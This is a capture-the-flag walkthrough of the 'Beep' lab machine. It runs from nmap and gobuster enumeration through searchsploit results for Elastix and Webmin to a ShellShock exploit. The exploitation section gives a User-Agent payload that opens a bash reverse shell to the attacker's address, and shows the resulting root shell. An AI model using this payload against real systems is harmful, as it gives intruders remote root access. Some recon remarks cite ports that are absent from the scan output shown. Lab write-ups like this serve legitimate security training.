### Recon

Initiating reconnaissance
```
sudo nmap -sC -sV 10.10.10.7
```

With the following results:
```
Nmap scan report for 10.10.10.7
Host is up (0.20s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: AUTH-RESP-CODE APOP LOGIN-DELAY(0) RESP-CODES UIDL USER IMPLEMENTATION(Cyrus POP3 server v2) STLS PIPELINING EXPIRE(NEVER) TOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            796/udp   status
|_  100024  1            799/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: THREAD=ORDEREDSUBJECT Completed URLAUTHA0001 IMAP4rev1 MULTIAPPEND NO BINARY UNSELECT ATOMIC QUOTA ID RENAME CATENATE NAMESPACE X-NETSCAPE SORT LIST-SUBSCRIBED STARTTLS LISTEXT IDLE UIDPLUS ACL CONDSTORE ANNOTATEMORE SORT=MODSEQ CHILDREN THREAD=REFERENCES OK LITERAL+ IMAP4 MAILBOX-REFERRALS RIGHTS=kxte
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2024-06-17T14:04:10+00:00; +1s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```

The OpenSSH version that is running on port 22 is pretty old. We’re used to seeing OpenSSH version 7.2. So it would be a good idea to check searchsploit to see if any critical vulnerabilities are associated with this version.

Ports 25, 110, 143, 995 are running mail protocols. We might need to find a valid email address to further enumerate these services. Port 4190 running Cyrus timsieved 2.3.7 seems to be associated to imapd.

Port 111 is running RPCbind. I don’t know much about this service but we can start enumerating it using the rpcinfo command that makes a call to the RPC server and reports what it finds. I think port 878 running the status service is associated to this.

Ports 80, 443 and 10000 are running web servers. Port 80 seems to redirect to port 443 so we only have two web servers to enumerate.

Port 3306 is running MySQL database. There is a lot of enumeration potential for this service.

Port 4559 is running HylaFAX 4.3.10. According to this, HylaFAX is running an open source fax server which allows sharing of fax equipment among computers by offering its service to clients by a protocol similar to FTP. We’ll have to check the version number to see if it is associated with any critical exploits.

Port 5038 is running running Asterisk Call Manager 1.1. Again, we’ll have to check the version number to see if it is associated with any critical exploits.

I’m not sure what the upnotifyp service on port 4445 does.

### Enumeration

As usual, I always start with enumerating HTTP first. In this case we have two web servers running on ports 443 and 10000.

# Port 443

It’s an off the shelf software running Elastix, which is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. The page does not have the version number of the software being used so right click on the site and click on View Page source. We don’t find anything there. Perhaps we can get the version number from one of its directories. Let's use gobuster on the application.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
```

dir: uses directory/file brute forcing mode

-w: path to the wordlist

-u: target URL or Domain

-k: skip SSL certificate verification

Get the following results:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]

```

The directories leak the version of FreePBX (2.8.1.4) being used but not the Elastix version number. 

Since this is an off the shelf software, the next step would be to run searchsploit to determine if it is associated with any vulnerabilities.

```
searchsploit elastix
```

With the following results:
```
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                        | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities      | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilitie | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion             | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                            | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                           | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution       | php/webapps/18650.py
------------------------------------------------------------- ---------------------------------

```

Cross-site scripting exploits are not very useful since they are client side attacks and therefore require end user interaction. The remote code execution (Solution #1) and local file inclusion (Solution #2) vulnerabilities are definitely interesting. The Blind SQL Injection is on the iridium_threed.php script that the server doesn’t seem to load. Plus it seems like it requires a customer to authenticate, so I’m going to avoid this exploit unless I get valid authentication credentials. The PHP Code Injection exploit is in the vtigercrm directory where the LFI vulnerability exists as well. So we’ll only look into that if the LFI vulnerability does not pan out.


# Port 10000

This seems to be an off the shelf software and therefore the first thing I’m going to do is run searchsploit on it.

```
searchsploit webmin
```

With a lot of vulnerabilities:

```

------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traver | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion             | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion         | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                     | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                            | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing  | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                      | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                           | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                 | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                           | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Me | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                      | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)         | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (M | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                         | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasp | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasplo | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)   | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (C | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)         | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)   | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                    | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit | linux/webapps/47330.rb
------------------------------------------------------------- ---------------------------------

```

One thing to notice is that several of the vulnerabilities mention cgi scripts which that the first thing you should try is the ShellShock vulnerability. This vulnerability affected web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. If it turns out to be not vulnerable to ShellShock, searchsploit returned a bunch of other exploits we can try.


### Exploitation

This solution involves attacking port 10000.

First, visit the webmin application.

Then intercept the request in Burp and send it to Repeater. Change the User Agent field to the following string.

```
() { :;}; bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

What that does is it exploits the ShellShock vulnerability and sends a reverse shell back to the attack machine. 

Set up a listener on the attack machine and get a shell as root:
```
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.7] 57413
bash: no job control in this shell
[root@beep webmin]#
```

